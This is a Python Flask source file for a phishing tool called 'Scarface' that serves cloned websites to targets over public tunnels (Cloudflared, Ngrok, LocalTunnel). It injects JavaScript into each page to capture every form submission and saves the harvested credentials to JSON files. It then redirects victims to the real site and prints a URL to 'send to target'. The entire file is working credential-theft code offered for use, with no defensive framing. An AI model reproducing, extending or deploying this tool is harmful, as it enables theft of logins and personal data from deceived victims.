import os
import sys
import subprocess
import threading
import json
import time
from datetime import datetime
from flask import Flask, request, redirect, send_from_directory

# Paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))  # Scarface/Harvest
SCARFACE_ROOT = os.path.abspath(os.path.join(SCRIPT_DIR, '..'))  # Scarface root directory
CREDENTIALS_DIR = os.path.join(SCARFACE_ROOT, "credentials")  # Scarface/credentials

# NEW: Also load sites from Scarface/sites/
SITES_DIRS = [
    os.path.join(SCRIPT_DIR, 'sites'),           # Scarface/Harvest/sites
    os.path.join(SCARFACE_ROOT, 'sites'),        # Scarface/sites
]

# UPDATED: Use exposers from the Scarface root directory
EXPOSE_DIR = os.path.join(SCARFACE_ROOT, 'expose')  # Scarface/expose

HARVEST_ROUTE = "/harvest"

# Flask config
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8080

# ANSI color codes for pretty CLI
CYAN = "\033[36m"
BLUE = "\033[34m"
RED = "\033[91m"
GREEN = "\033[92m"
LIGHT_GREEN = "\033[38;5;120m"
BOLD = "\033[1m"
RESET = "\033[0m"

app = Flask(__name__)
selected_site_name = None
selected_site_dir = None
entry_file = None

def save_credentials(site, log_data):
    """
    Save credentials to Scarface/credentials/<sitename>/result.json
    """
    site_dir = os.path.join(CREDENTIALS_DIR, site)
    os.makedirs(site_dir, exist_ok=True)
    credentials_file = os.path.join(site_dir, "result.json")
    try:
        with open(credentials_file, "r") as f:
            data = json.load(f)
            if not isinstance(data, list):
                data = []
    except Exception:
        data = []
    data.append(log_data)
    with open(credentials_file, "w") as f:
        json.dump(data, f, indent=4)

def list_cloned_sites():
    # Collect all unique directories in all SITES_DIRS
    found_sites = set()
    for sites_dir in SITES_DIRS:
        if not os.path.exists(sites_dir):
            os.makedirs(sites_dir, exist_ok=True)
        for d in os.listdir(sites_dir):
            full_dir = os.path.join(sites_dir, d)
            if os.path.isdir(full_dir):
                found_sites.add(d)
    return sorted(list(found_sites))

def get_site_dir(site_name):
    # Prefer root Scarface/sites, then fallback to Harvest/sites
    for sites_dir in SITES_DIRS[::-1]:
        site_path = os.path.join(sites_dir, site_name)
        if os.path.isdir(site_path):
            return site_path
    # Fallback: default to the first SITES_DIR
    return os.path.join(SITES_DIRS[0], site_name)

def select_site(sites):
    print(f"\n{BOLD}{CYAN}Available Cloned Sites:{RESET}")
    for idx, site in enumerate(sites, 1):
        print(f"  {CYAN}{idx}.{RESET} {site}")
    while True:
        try:
            choice = int(input(f"\n{BLUE}Enter site number to deploy:{RESET} "))
            if 1 <= choice <= len(sites):
                return sites[choice - 1]
            print(f"{RED}[ERROR] Invalid number{RESET}")
        except ValueError:
            print(f"{RED}[ERROR] Enter a number{RESET}")

def detect_entry_file(site_dir):
    index_path = os.path.join(site_dir, "index.html")
    if os.path.exists(index_path):
        return "index.html"
    html_files = [f for f in os.listdir(site_dir) if f.endswith(".html")]
    if html_files:
        return html_files[0]
    print(f"{RED}[ERROR] No HTML files found in the selected site directory.{RESET}")
    sys.exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def expose_menu():
    print(f"\n{BOLD}{CYAN}Expose to the internet{RESET}")
    print(f"{CYAN}developer: zerosocialcode | {BOLD}Scarface{RESET}\n")
    print(f"{CYAN}1.{RESET} Cloudflared (Cloudflare Tunnel)")
    print(f"{CYAN}2.{RESET} Ngrok")
    print(f"{CYAN}3.{RESET} LocalTunnel")
    print(f"{CYAN}4.{RESET} Localhost only")
    print(f"{CYAN}5.{RESET} Exit")
    while True:
        try:
            option = int(input(f"\n{BLUE}Choose an option:{RESET} "))
            if 1 <= option <= 5:
                return option
            print(f"{RED}[ERROR] Invalid option{RESET}")
        except ValueError:
            print(f"{RED}[ERROR] Enter a number{RESET}")

def run_expose_and_get_url(option):
    expose_scripts = {
        1: "cloudflared.py",
        2: "ngrok.py",
        3: "localtunnel.py"
    }
    url_patterns = {
        1: r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com",
        2: r"https://[a-zA-Z0-9\-]+\.ngrok\.io",
        3: r"https://[a-zA-Z0-9\-]+\.loca\.lt"
    }
    if option in expose_scripts:
        print(f"\n{CYAN}Launching tunnel...{RESET}")
        script = os.path.join(EXPOSE_DIR, expose_scripts[option])
        proc = subprocess.Popen(
            [sys.executable, script],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        import re
        url_regex = re.compile(url_patterns[option])
        url = None
        start = time.time()
        max_wait = 30  # seconds
        while time.time() - start < max_wait:
            line = proc.stdout.readline()
            if not line:
                continue
            match = url_regex.search(line)
            if match:
                url = match.group(0)
                break
        if url:
            print(f"\n{BOLD}{CYAN}Send this to target:{RESET} {LIGHT_GREEN}{url}{RESET}")
        else:
            print(f"{RED}[ERROR] Could not extract public URL. Check your tunnel process manually.{RESET}")
    elif option == 4:
        print(f"\n{CYAN}Launched on localhost only. No tunnel started.{RESET}")
    elif option == 5:
        print(f"{GREEN}Goodbye from Scarface!{RESET}")
        os._exit(0)

INJECTION_SCRIPT = f"""
<script>
    document.addEventListener('submit', function(event) {{
        const form = event.target;
        const formData = new FormData(form);
        const data = {{}};
        formData.forEach((value, key) => data[key] = value);
        fetch('{HARVEST_ROUTE}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(data)
        }});
    }});
</script>
"""

@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def serve_site(path):
    global entry_file, selected_site_dir, selected_site_name
    if selected_site_dir is None or entry_file is None:
        return "No site selected. Restart Scarface.", 500
    if not path:
        path = entry_file
    file_path = os.path.join(selected_site_dir, path)
    abs_file_path = os.path.abspath(file_path)
    if not abs_file_path.startswith(os.path.abspath(selected_site_dir)):
        return "Forbidden.", 403
    if request.method == "POST":
        form_data = request.form.to_dict()
        log_data = {
            "timestamp": str(datetime.now()),
            "form_data": form_data
        }
        save_credentials(selected_site_name, log_data)
        return redirect("https://original-website.com")
    if os.path.exists(file_path) and os.path.isfile(file_path):
        if file_path.endswith(".html"):
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
            content = content.replace("</body>", f"{INJECTION_SCRIPT}</body>")
            return content
        else:
            rel_path = os.path.relpath(file_path, selected_site_dir)
            return send_from_directory(selected_site_dir, rel_path)
    return "404 - Not Found", 404

@app.route(HARVEST_ROUTE, methods=["POST"])
def harvest():
    global selected_site_name
    try:
        harvested_data = request.get_json()
    except Exception:
        harvested_data = {}
    log_data = {
        "timestamp": str(datetime.now()),
        "harvested_data": harvested_data
    }
    save_credentials(selected_site_name, log_data)
    print(f"{GREEN}{BOLD}Captured credentials!{RESET}")
    return "", 204

def flask_runner():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False, use_reloader=False)

def main():
    global selected_site_name, selected_site_dir, entry_file
    clear_screen()
    print(f"\n{BOLD}{CYAN}=== Scarface ==={RESET}")
    cloned_sites = list_cloned_sites()
    if not cloned_sites:
        print(f"{RED}[INFO] No sites found in sites directory.{RESET}")
        sys.exit(1)
    selected_site_name = select_site(cloned_sites)
    selected_site_dir = get_site_dir(selected_site_name)
    entry_file = detect_entry_file(selected_site_dir)

    clear_screen()
    print(f"\n{CYAN}Launching localhost...{RESET}")
    flask_thread = threading.Thread(target=flask_runner, daemon=True)
    flask_thread.start()
    import socket
    for _ in range(30):
        try:
            with socket.create_connection(("127.0.0.1", LISTEN_PORT), timeout=0.5):
                break
        except OSError:
            time.sleep(0.3)
    print(f"{GREEN}Localhost launched!{RESET}")
    time.sleep(1)
    clear_screen()
    option = expose_menu()
    run_expose_and_get_url(option)
    try:
        while True:
            flask_thread.join(1)
    except KeyboardInterrupt:
        print(f"\n{GREEN}Goodbye from Scarface!{RESET}")
        os._exit(0)

if __name__ == "__main__":
    if not os.path.exists(CREDENTIALS_DIR):
        os.makedirs(CREDENTIALS_DIR)
    main()
